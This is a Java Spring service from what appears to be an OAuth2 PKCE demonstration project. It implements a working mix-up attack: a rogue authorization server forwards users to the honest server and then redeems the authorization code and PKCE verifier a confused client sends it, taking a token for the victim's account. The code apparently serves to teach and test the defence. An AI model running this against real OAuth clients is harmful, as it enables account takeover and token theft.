package id.my.hendisantika.oauth2pkcedemo.service;

import com.nimbusds.jwt.JWTParser;
import id.my.hendisantika.oauth2pkcedemo.config.DemoProperties;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.endpoint.OAuth2ParameterNames;
import org.springframework.stereotype.Service;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestClient;
import org.springframework.web.util.UriComponentsBuilder;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Created by IntelliJ IDEA.
 * Project : spring-boot-oauth2-pkce-demo
 * User: hendisantika
 * Email: hendisantika@gmail.com
 * Telegram : @hendisantika34
 * Date: 13/09/26
 * Time: 18.33
 */
@Slf4j
@Service
public class MixUpAttackerService {

    private final RestClient restClient;
    private final DemoProperties properties;

    public MixUpAttackerService(DemoProperties properties) {
        this.properties = properties;
        this.restClient = RestClient.create(properties.issuerUri());
    }

    /** Where this rogue authorization server claims to live. */
    public String issuer() {
        return properties.issuerUri() + "/mixup/attacker";
    }

    public String authorizationEndpoint() {
        return issuer() + "/authorize";
    }

    public String tokenEndpoint() {
        return issuer() + "/token";
    }

    /**
     * The mix-up itself. A client that supports several authorization servers sends the user to
     * whichever one it was asked for; this one does not authenticate anybody, it forwards the
     * request to the honest server under the honest client's identity and lets the user sign in
     * there. Everything the client wrote down - its state, its redirect URI, its code challenge -
     * is carried across untouched, so what comes back looks exactly like the answer it is waiting
     * for.
     */
    public String mixUpRedirect(Map<String, String> authorizationRequest) {
        DemoProperties.Client honestClient = properties.mixUpClient();
        UriComponentsBuilder redirect =
                UriComponentsBuilder.fromUriString(properties.issuerUri() + "/oauth2/authorize")
                        .queryParam(OAuth2ParameterNames.RESPONSE_TYPE, "code")
                        // The client id at the honest server. Client identifiers are not secrets.
                        .queryParam(OAuth2ParameterNames.CLIENT_ID, honestClient.clientId())
                        .queryParam(OAuth2ParameterNames.REDIRECT_URI,
                                authorizationRequest.get(OAuth2ParameterNames.REDIRECT_URI))
                        .queryParam(OAuth2ParameterNames.SCOPE, String.join(" ", honestClient.scopes()))
                        .queryParam(OAuth2ParameterNames.STATE,
                                authorizationRequest.get(OAuth2ParameterNames.STATE))
                        .queryParam("code_challenge", authorizationRequest.get("code_challenge"))
                        .queryParam("code_challenge_method", "S256");
        log.debug("Mix-up: forwarding the authorization request to the honest server");
        return redirect.build().encode().toUriString();
    }

    /**
     * What the attacker gains. A client that could not tell who answered posts the authorization
     * code here, to the token endpoint of the server it believes it started with - and posts the
     * PKCE code verifier alongside it, because that is what a token request contains. Both halves
     * arrive together, so the code is redeemable, and this proves it by redeeming it.
     *
     * @return what was taken, reported honestly because this is a demonstration; a real attacker
     *         would answer with something plausible and say nothing
     */
    public Map<String, Object> receiveStolenCode(String code, String codeVerifier, String redirectUri) {
        Map<String, Object> report = new LinkedHashMap<>();
        report.put("stolen_code", code);
        report.put("stolen_code_verifier", codeVerifier);

        MultiValueMap<String, String> form = new LinkedMultiValueMap<>();
        form.add(OAuth2ParameterNames.GRANT_TYPE, AuthorizationGrantType.AUTHORIZATION_CODE.getValue());
        form.add(OAuth2ParameterNames.CODE, code);
        form.add(OAuth2ParameterNames.REDIRECT_URI, redirectUri);
        form.add(OAuth2ParameterNames.CLIENT_ID, properties.mixUpClient().clientId());
        form.add("code_verifier", codeVerifier);

        restClient.post()
                .uri("/oauth2/token")
                .contentType(MediaType.APPLICATION_FORM_URLENCODED)
                .body(form)
                .exchange((request, response) -> {
                    if (!response.getStatusCode().is2xxSuccessful()) {
                        report.put("redeemed", false);
                        return report;
                    }
                    Map<?, ?> body = response.bodyTo(Map.class);
                    String accessToken = body == null ? null : String.valueOf(body.get("access_token"));
                    report.put("redeemed", accessToken != null);
                    report.put("subject", subjectOf(accessToken));
                    log.warn("Mix-up: redeemed a stolen authorization code at the honest server");
                    return report;
                }, false);
        return report;
    }

    /** Whose account the attacker is now holding a token for. */
    private static String subjectOf(String accessToken) {
        try {
            return JWTParser.parse(accessToken).getJWTClaimsSet().getSubject();
        } catch (Exception ex) {
            return null;
        }
    }
}
